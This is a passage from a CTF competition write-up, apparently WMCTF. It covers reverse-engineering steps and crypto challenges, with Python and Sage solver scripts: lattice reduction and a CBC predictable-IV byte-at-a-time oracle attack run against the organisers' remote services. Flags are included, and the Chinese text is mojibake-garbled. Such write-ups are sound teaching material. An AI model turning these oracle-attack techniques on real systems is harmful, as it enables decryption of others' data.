</span></span><span class=line><span class=cl>-0x1234567812345678123456781234567812345678123456781234567812345678
</span></span><span class=line><span class=cl>0x1790fc4efe2923a51ea676027908f3670d509bd2db7d6f45e38f6dc0258697415aaff6dd5ca9006aead7b3ea053c115aabd618bcdea5ca109dab2555e8e62a566a06666b81753587d2c92fab5e0254d62320a508222420415b0cc681cdda98
</span></span><span class=line><span class=cl>mod
</span></span><span class=line><span class=cl>0xF4, 0x56, 0x29, 0xCE, 0xB3, 0x4D, 0x25, 0xBD, 0xD4, 0xC2, 
</span></span><span class=line><span class=cl>  0xED, 0xDA, 0x01, 0xB2, 0x67, 0xDF, 0x8E, 0xBB, 0x5F, 0x00, 
</span></span><span class=line><span class=cl>  0x1F, 0x6D, 0x5A, 0x2F, 0x3D, 0x85, 0xE8, 0xF3, 0x8F, 0x45, 
</span></span><span class=line><span class=cl>  0xB3, 0x6F
</span></span><span class=line><span class=cl>è¿™æ˜¯mod1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mod1*input
</span></span><span class=line><span class=cl>0x60, 0xBA, 0x26, 0x58, 0x6D, 0x56, 0xC2, 0xF6, 0xBA, 0x2C, 
</span></span><span class=line><span class=cl>  0x2C, 0xFE, 0x23, 0x6D, 0x59, 0xD6, 0xBD, 0x02, 0xF6, 0x50, 
</span></span><span class=line><span class=cl>  0x08, 0x62, 0x54, 0x3C, 0xA9, 0x5E, 0xD7, 0x0B, 0xAD, 0x3A, 
</span></span><span class=line><span class=cl>  0xA2, 0xE1, 0x55, 0xF1, 0x6C, 0x91, 0x48, 0x55, 0xD1, 0xF2, 
</span></span><span class=line><span class=cl>  0xFA, 0x7E, 0x67, 0xEB, 0x91, 0x3E, 0x3A, 0x13, 0xF8, 0xA8, 
</span></span><span class=line><span class=cl>  0x9D, 0x98, 0xAD, 0x49, 0x3F, 0xAD, 0x0C, 0x4D, 0xBC, 0xDD, 
</span></span><span class=line><span class=cl>  0x08, 0x71, 0xF1, 0x07
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  mod1*input-0x14b66dc208ba5f83fcbe5145f0c24307e4c634c9d8ca268bccce184dc0d20a0f8b69204d97652e8ba3613cc9af5d4b07bb595945c7556783d35175c1df4d83e
</span></span><span class=line><span class=cl>  0x22, 0xE2, 0x31, 0x3A, 0x11, 0x3F, 0x8D, 0xB9, 0x42, 0xD6, 
</span></span><span class=line><span class=cl>  0xB6, 0xA1, 0x8F, 0xD7, 0xA3, 0x5A, 0x0D, 0x2E, 0x00, 0xB6, 
</span></span><span class=line><span class=cl>  0x3B, 0x4E, 0x1E, 0x82, 0xC0, 0x0B, 0x61, 0x32, 0xA8, 0xA8, 
</span></span><span class=line><span class=cl>  0xEB, 0xE8, 0xB4, 0xD0, 0x5F, 0xB5, 0xC3, 0x73, 0x04, 0x36, 
</span></span><span class=line><span class=cl>  0x92, 0xDC, 0xDA, 0x4D, 0x45, 0xDB, 0xED, 0x94, 0xC7, 0x84, 
</span></span><span class=line><span class=cl>  0x91, 0x39, 0x99, 0x64, 0x73, 0x6D, 0x14, 0xA7, 0x30, 0xBD, 
</span></span><span class=line><span class=cl>  0x2C, 0x0A, 0xA6, 0x06, 0x00
</span></span><span class=line><span class=cl>  å’Œ0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15 + n mod
</span></span><span class=line><span class=cl>  mod2
</span></span><span class=line><span class=cl>  0x9C, 0x23, 0x26, 0x35, 0x7B, 0xB2, 0x09, 0xE8, 0xA0, 0xAC, 
</span></span><span class=line><span class=cl>  0x2D, 0x99, 0x7B, 0x0A, 0x8C, 0x99, 0xF6, 0x7C, 0x5F, 0xCB, 
</span></span><span class=line><span class=cl>  0x15, 0x6E, 0x54, 0xBA, 0xBF, 0x36, 0x3E, 0xC4, 0x50, 0xDB, 
</span></span><span class=line><span class=cl>  0xE6, 0x61
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  mod2*mod1
</span></span><span class=line><span class=cl>  0xB0, 0x58, 0x4C, 0xB4, 0x20, 0x87, 0xA0, 0x19, 0x9D, 0xF5, 
</span></span><span class=line><span class=cl>  0x83, 0x1D, 0x83, 0x0F, 0xC3, 0xB8, 0x6B, 0x3D, 0x56, 0x42, 
</span></span><span class=line><span class=cl>  0xCF, 0xA7, 0xE8, 0x3E, 0xD1, 0xA5, 0xF3, 0xCE, 0x06, 0x6D, 
</span></span><span class=line><span class=cl>  0x45, 0x88, 0x7A, 0x85, 0xE1, 0x3C, 0x58, 0xA2, 0xBC, 0x11, 
</span></span><span class=line><span class=cl>  0x86, 0xF0, 0x1A, 0x7C, 0x4A, 0x5A, 0x41, 0xB7, 0x18, 0x9A, 
</span></span><span class=line><span class=cl>  0x0B, 0x09, 0xCB, 0x3C, 0xE4, 0x8E, 0x98, 0x86, 0xE8, 0xA4, 
</span></span><span class=line><span class=cl>  0x1D, 0xA8, 0xB7, 0x2A, 0x00
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  mod2*mod1-input
</span></span><span class=line><span class=cl>  0x38, 0x02, 0x18, 0xA2, 0xA8, 0x30, 0x6C, 0x07, 0x25, 0x9F, 
</span></span><span class=line><span class=cl>  0x4F, 0x0B, 0x0B, 0xB9, 0x8E, 0xA6, 0xF3, 0xE6, 0x21, 0x30, 
</span></span><span class=line><span class=cl>  0x57, 0x51, 0xB4, 0x2C, 0x59, 0x4F, 0xBF, 0xBC, 0x8E, 0x16, 
</span></span><span class=line><span class=cl>  0x11, 0x76, 0x7A, 0x85, 0xE1, 0x3C, 0x58, 0xA2, 0xBC, 0x11, 
</span></span><span class=line><span class=cl>  0x86, 0xF0, 0x1A, 0x7C, 0x4A, 0x5A, 0x41, 0xB7, 0x18, 0x9A, 
</span></span><span class=line><span class=cl>  0x0B, 0x09, 0xCB, 0x3C, 0xE4, 0x8E, 0x98, 0x86, 0xE8, 0xA4, 
</span></span><span class=line><span class=cl>  0x1D, 0xA8, 0xB7, 0x2A
</span></span><span class=line><span class=cl>  mod2*mod1-inputå’Œ0xE98C3C3C3C3C3C3C3C3C3C3C3C3C3C6B15 + n mod
</span></span><span class=line><span class=cl>  0x84, 0x89, 0x81, 0xDB, 0x91, 0x0B, 0x73, 0x5D, 0xAE, 0xE3, 
</span></span><span class=line><span class=cl>  0xC3, 0x37, 0x30, 0x51, 0x21, 0x52, 0xD5, 0x1B, 0x83, 0xD4, 
</span></span><span class=line><span class=cl>  0x37, 0x45, 0x8C, 0xA4, 0xF6, 0xBA, 0x76, 0xC3, 0xAF, 0xE3, 
</span></span><span class=line><span class=cl>  0xDD, 0xE2
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  mod3
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  mod3ç»“æœå’Œ
</span></span><span class=line><span class=cl>  0x45, 0x84, 0x2F, 0x86, 0x44, 0x61, 0x1A, 0xDE, 0x59, 0x37, 
</span></span><span class=line><span class=cl>  0xD6, 0xD7, 0xC2, 0x8D, 0x6A, 0x67, 0xB1, 0x35, 0xB9, 0x53, 
</span></span><span class=line><span class=cl>  0xC7, 0xCF, 0xEF, 0xBD, 0xD5, 0x35, 0x85, 0x7D, 0x79, 0x04, 
</span></span><span class=line><span class=cl>  0x47, 0x23
</span></span><span class=line><span class=cl>  æ¯”è¾ƒ  
</span></span></code></pre></td></tr></table></div></div><p>æ€»ç»“ä¸ºï¼š
$$
\begin{aligned}
y &\equiv x^2 - 2 \
z &\equiv y \cdot x - x \equiv x^3 - 3x \pmod{n} \
a &\equiv z \cdot x - y \equiv (x^3 - 3x )x - (x^2 - 2) \equiv x^4 - 4x^2 + 2 \pmod{n} \
b &\equiv a \cdot z - x \equiv (x^4-4x^2 + 2) (x^3 - 3x)
-x \equiv x^7 -7x^5 + 14x^3 - 7x \pmod{n}
\end{aligned}
$$</p><p>è¯•äº†ä¸€ä¸‹ï¼Œæ¨¡æ•°nå¯ä»¥è¢«åˆ†è§£ä¸ºä¸¤ä¸ªç´ æ•°ï¼š</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_aa549cd4b2fea446ef3cede72d45f0ca.png alt></p><p>p = 320265757102059730318470218759311257989
q = 361550014853497117429835520396253724753</p><p>é€šè¿‡Mathematicaå¯ä»¥åˆ†åˆ«åœ¨mod på’Œmod qä¸Šè§£å‡ºæ¥x</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_8cdadd80b40e712d8885735244da2871.png alt></p><p><img src=https://hackmd.summershrimp.com/uploads/upload_4e390411a80f80ec29f9859d80ff4d67.png alt></p><p>ç„¶åå†ç”¨CRTå³å¯å¾—åˆ°åœ¨mod nä¸‹çš„è§£ï¼š17608204545242378720348793798058123425575979093234353645947732994798163637792</p><p>ç¨‹åºè¾“å…¥flag{26EDE3FE048B6BFA04F647259A3F00505FD9C9CCB87298CD631FD91F17CCB620}</p><p><img src=https://hackmd.summershrimp.com/uploads/upload_f4ea85e2037390a2008bdb99f9973dd6.png alt></p><p>æäº¤éœ€è¦å°†"flag"æ”¹æˆ"WMCTF"</p><h3 id=easy_apk>easy_apk</h3><p>ä¸€ä¸ªå®‰å“é€†å‘,å­—ç¬¦ä¸²éƒ½è¢«åŠ å¯†äº†,çœ‹äº†ä¸€ä¸‹è°ƒç”¨äº†nativeçš„checkå‡½æ•°,åœ¨idaé‡Œçœ‹äº†ä¸€ä¸‹checkå‡½æ•°,åˆ¤æ–­é•¿åº¦æ˜¯ä¸æ˜¯32,ç„¶åå–å‡ºå¶æ•°ä½,ä½¿ç”¨AESåŠ å¯†,ç„¶åç”¨åŠ å¯†çš„ç»“æœ,ä½œä¸ºç¥–å†²ä¹‹ç®—æ³•çš„å¯†é’¥åŠ å¯†å…¨éƒ¨çš„flag.
åæ¥æ”¹é¢˜äº†AESç”Ÿæˆçš„é‚£ä¸ªç¥–å†²ä¹‹ç®—æ³•çš„key,æ˜¯å·²çŸ¥çš„äº†,ç„¶åå› ä¸ºé‚£ä¸ªæ˜¯æµåŠ å¯†,æ‰€ä»¥ç›´æ¥æŠŠåŠ å¯†åçš„flagå¸¦å›å»å°±æ‹¿åˆ°flagäº†.</p><h2 id=crypto>Crypto</h2><h3 id=babysum>babySum</h3><p>Random BKZ Blocksize 24</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>from</span> <span class=n>json</span> <span class=n>import</span> <span class=nb>load</span>
</span></span><span class=line><span class=cl><span class=n>import</span> <span class=n>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check</span><span class=p>(</span><span class=n>sol</span><span class=p>,</span> <span class=n>A</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span><span class=p>,</span> <span class=n>a</span> <span class=ow>in</span> <span class=n>zip</span><span class=p>(</span><span class=n>sol</span><span class=p>,</span> <span class=n>A</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>s</span> <span class=o>+=</span> <span class=n>x</span><span class=o>*</span><span class=n>a</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>s</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>k</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>d</span> <span class=o>=</span> <span class=mi>20</span><span class=p>,</span> <span class=mi>120</span><span class=p>,</span> <span class=mf>0.8</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>,</span> <span class=n>A</span> <span class=o>=</span> <span class=nb>load</span><span class=p>(</span><span class=n>open</span><span class=p>(</span><span class=s2>&#34;data&#34;</span><span class=p>,</span> <span class=s2>&#34;r&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>N</span> <span class=o>=</span> <span class=mi>50</span>
</span></span><span class=line><span class=cl><span class=n>BS</span> <span class=o>=</span> <span class=mi>24</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>lat</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>a</span> <span class=ow>in</span> <span class=n>enumerate</span><span class=p>(</span><span class=n>A</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>lat</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=mi>1</span><span class=o>*</span><span class=p>(</span><span class=n>j</span> <span class=o>==</span> <span class=n>i</span><span class=p>)</span> <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>)]</span> <span class=o>+</span> <span class=p>[</span><span class=n>N</span><span class=o>*</span><span class=n>a</span><span class=p>]</span> <span class=o>+</span> <span class=p>[</span><span class=n>N</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>lat</span><span class=o>.</span><span class=n>append</span><span class=p>([</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=n>n</span> <span class=o>+</span> <span class=p>[</span><span class=n>N</span><span class=o>*</span><span class=n>s</span><span class=p>]</span> <span class=o>+</span> <span class=p>[</span><span class=n>k</span><span class=o>*</span><span class=n>N</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>itr</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>itr</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>itr</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>nums</span> <span class=o>=</span> <span class=n>lat</span><span class=p>[::]</span>
</span></span><span class=line><span class=cl>    <span class=n>shuffle</span><span class=p>(</span><span class=n>nums</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>m</span> <span class=o>=</span> <span class=n>matrix</span><span class=p>(</span><span class=n>ZZ</span><span class=p>,</span> <span class=n>nums</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ml</span> <span class=o>=</span> <span class=n>m</span><span class=o>.</span><span class=n>BKZ</span><span class=p>(</span><span class=n>block_size</span><span class=o>=</span><span class=n>BS</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>row</span> <span class=ow>in</span> <span class=n>enumerate</span><span class=p>(</span><span class=n>ml</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=o>-</span><span class=mi>1</span> <span class=o>&lt;=</span> <span class=nb>min</span><span class=p>(</span><span class=n>row</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span> <span class=ow>and</span> <span class=nb>max</span><span class=p>(</span><span class=n>row</span><span class=p>[:</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span> <span class=o>&lt;=</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>len</span><span class=p>(</span><span class=n>row</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>row</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>row</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>*=</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>temp_bool</span> <span class=o>=</span> <span class=p>(</span><span class=n>check</span><span class=p>(</span><span class=n>row</span><span class=p>,</span> <span class=n>A</span><span class=p>)</span> <span class=o>==</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>temp_bool</span> <span class=o>==</span> <span class=n>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>,</span> <span class=n>row</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>quit</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.summershrimp.com/uploads/upload_faf549fca1bd7700eaead38dfb8281f4.png alt></p><h3 id=piece_of_cake>piece_of_cake</h3><p>äºŒç»´æ ¼å¯ä»¥ç”¨é«˜æ–¯æ ¼åŸºè§„çº¦ï¼Œå¤šè¯•å‡ ç»„æ•°æ®å°±å¯ä»¥è·‘å‡ºæ¥äº†</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from gmpy2 import iroot, sqrt
</span></span><span class=line><span class=cl>from Crypto.Util.number import *
</span></span><span class=line><span class=cl>from pwn import remote
</span></span><span class=line><span class=cl>import string
</span></span><span class=line><span class=cl>from hashlib import sha256
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>r = remote(&#39;81.68.174.63&#39;, 8631)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def proof_of_work(txt, Hash):
</span></span><span class=line><span class=cl>    S = string.ascii_letters+string.digits
</span></span><span class=line><span class=cl>    for a in S:
</span></span><span class=line><span class=cl>        for b in S:
</span></span><span class=line><span class=cl>            for c in S:
</span></span><span class=line><span class=cl>                if sha256((a+b+c+txt).encode()).hexdigest() == Hash:
</span></span><span class=line><span class=cl>                    print(a+b+c)
</span></span><span class=line><span class=cl>                    return a+b+c
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def gaussian(v1, v2):
</span></span><span class=line><span class=cl>    while True:
</span></span><span class=line><span class=cl>        if sqrt(v2[0]**2+v2[1]**2) &lt; sqrt(v1[0]**2+v1[1]**2):
</span></span><span class=line><span class=cl>            v1, v2 = v2, v1
</span></span><span class=line><span class=cl>        m = int((v1[0]*v2[0]+v1[1]*v2[1])/(v1[0]**2+v1[1]**2))
</span></span><span class=line><span class=cl>        if m == 0:
</span></span><span class=line><span class=cl>            return (v1, v2)
</span></span><span class=line><span class=cl>        v2 = [v2[0]-m*v1[0], v2[1]-m*v1[1]]
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>r.recvuntil(&#34;XXX+&#34;)
</span></span><span class=line><span class=cl>nonce = r.recv(17).decode()
</span></span><span class=line><span class=cl>r.recvuntil(&#34; == &#34;)
</span></span><span class=line><span class=cl>target = r.recv(64).decode()
</span></span><span class=line><span class=cl>r.recvuntil(&#34;\nGive me XXX:&#34;)
</span></span><span class=line><span class=cl>w = proof_of_work(nonce, target)
</span></span><span class=line><span class=cl>r.send(str(w)+&#34;\n&#34;)
</span></span><span class=line><span class=cl>print(&#34;----------proof of work is ok!----------&#34;)
</span></span><span class=line><span class=cl>temp = r.recvuntil(&#34;What&#39;s your choice?\n&#34;)
</span></span><span class=line><span class=cl>r.send(&#34;1\n&#34;)
</span></span><span class=line><span class=cl>temp = r.recvline()
</span></span><span class=line><span class=cl>temp = r.recvline().strip().decode().split(&#34; &#34;)
</span></span><span class=line><span class=cl>q, h, c = [int(i) for i in temp]
</span></span><span class=line><span class=cl>N = int(r.recvline().strip().decode())
</span></span><span class=line><span class=cl>cip = int(r.recvline().strip().decode())
</span></span><span class=line><span class=cl>s1, s2 = gaussian([1, h], [0, q])
</span></span><span class=line><span class=cl>f, g = s1[0], s1[1]
</span></span><span class=line><span class=cl>cake = (c*f % q) % g
</span></span><span class=line><span class=cl>cake = inverse(f, g)*cake % g
</span></span><span class=line><span class=cl>for k in range(100000):
</span></span><span class=line><span class=cl>    if pow(cake+k*g, 0x10001, N) == cip:
</span></span><span class=line><span class=cl>        cake = cake+k*g
</span></span><span class=line><span class=cl>        print(&#34;cake is: &#34;, cake)
</span></span><span class=line><span class=cl>        break
</span></span><span class=line><span class=cl>r.send(str(cake)+&#34;\n&#34;)
</span></span><span class=line><span class=cl>print(r.recvline().strip().decode())
</span></span><span class=line><span class=cl>#WMCTF{Wh4t_A_pi3ce_of_CAKE!}
</span></span></code></pre></td></tr></table></div></div><h3 id=game>Game</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>from pwn import remote
</span></span><span class=line><span class=cl>from hashlib import sha256
</span></span><span class=line><span class=cl>from Crypto.Util.number import *
</span></span><span class=line><span class=cl>import string
</span></span><span class=line><span class=cl>import os
</span></span><span class=line><span class=cl>r = remote(&#39;81.68.174.63&#39;, 16442)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def proof_of_work(txt, Hash):
</span></span><span class=line><span class=cl>    S = string.ascii_letters+string.digits
</span></span><span class=line><span class=cl>    for a in S:
</span></span><span class=line><span class=cl>        for b in S:
</span></span><span class=line><span class=cl>            for c in S:
</span></span><span class=line><span class=cl>                for d in S:
</span></span><span class=line><span class=cl>                    if sha256((a+b+c+d+txt).encode()).hexdigest() == Hash:
</span></span><span class=line><span class=cl>                        print(a+b+c+d)
</span></span><span class=line><span class=cl>                        return a+b+c+d
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>def select_x(x):
</span></span><span class=line><span class=cl>    r.recvuntil(&#34;3. exit\n&#34;)
</span></span><span class=line><span class=cl>    r.recvuntil(&#34;&gt;&#34;)
</span></span><span class=line><span class=cl>    r.send(str(x))
</span></span><span class=line><span class=cl>    r.recvuntil(&#34;(in hex): &#34;)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>r.recvuntil(&#34;XXXX+&#34;)
</span></span><span class=line><span class=cl>nonce = r.recv(16).decode()
</span></span><span class=line><span class=cl>r.recvuntil(&#34; == &#34;)
</span></span><span class=line><span class=cl>target = r.recv(64).decode()
</span></span><span class=line><span class=cl>print(&#34;waiting....&#34;)
</span></span><span class=line><span class=cl>w = proof_of_work(nonce, target)
</span></span><span class=line><span class=cl>r.send(str(w))
</span></span><span class=line><span class=cl>print(&#34;----------proof of work is ok!----------&#34;)
</span></span><span class=line><span class=cl>r.recvuntil(&#34;IV is: &#34;)
</span></span><span class=line><span class=cl>IV = r.recv(32).decode()  # 16 bytes -&gt; 32 hexlength
</span></span><span class=line><span class=cl>print(&#34;IV is: {}&#34;.format(IV))
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>secret = b&#34;&#34;
</span></span><span class=line><span class=cl>for Byte in range(48):#Byteå’Œæ‰§è¡Œå‰secretçš„å·²çŸ¥é•¿åº¦æ˜¯ç­‰ä»·çš„ 15 = byte_len+Byte mod 16
</span></span><span class=line><span class=cl>    byte_len = (15 - (Byte % 16)) if ((Byte % 16) != 15) else 16
</span></span><span class=line><span class=cl>    bound = ((byte_len + Byte + 1) // 16) * 32 # åº”è¯¥ç›¸ç­‰çš„èŒƒå›´åº”è¯¥æ˜¯[bound-32:bound]
</span></span><span class=line><span class=cl>    select_x(1)
</span></span><span class=line><span class=cl>    r_ = os.urandom(byte_len)
</span></span><span class=line><span class=cl>    r.send(r_.hex())
</span></span><span class=line><span class=cl>    C_ = r.recvline().strip().decode()
</span></span><span class=line><span class=cl>    C0 = IV if bound==32 else C_[bound-64:bound-32]
</span></span><span class=line><span class=cl>    IV = C_[-32:] # æ¯æ¬¡åŠ å¯†ååŠæ—¶æ›´æ–°IV
</span></span><span class=line><span class=cl>    print(&#34;brute force {} byte&#34;.format(Byte+1))
</span></span><span class=line><span class=cl>    for i in range(256):
</span></span><span class=line><span class=cl>        select_x(1)
</span></span><span class=line><span class=cl>        Pi = int(C0, 16) ^ int(IV, 16) ^ int((r_.hex()+secret.hex())[-30:]+long_to_bytes(i).hex(), 16)
</span></span><span class=line><span class=cl>        r.send(long_to_bytes(Pi).hex())
</span></span><span class=line><span class=cl>        Ci = r.recvline().strip().decode()
</span></span><span class=line><span class=cl>        IV = Ci[-32:]
</span></span><span class=line><span class=cl>        if Ci[:32] == C_[bound-32:bound]:
</span></span><span class=line><span class=cl>            secret += long_to_bytes(i)
</span></span><span class=line><span class=cl>            print(&#34;Current secret: {}&#34;.format(secret))
</span></span><span class=line><span class=cl>            break
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>print(&#34;secret is: {}&#34;.format(secret))
</span></span><span class=line><span class=cl>select_x(2)
</span></span><span class=line><span class=cl>r.send(secret.hex())
</span></span><span class=line><span class=cl>flag = r.recvline().strip().decode()
</span></span><span class=line><span class=cl>print(flag)
</span></span><span class=line><span class=cl>#WMCTF{Dont_ever_tell_anybody_anything___If_you_do__you_start_missing_everybody}
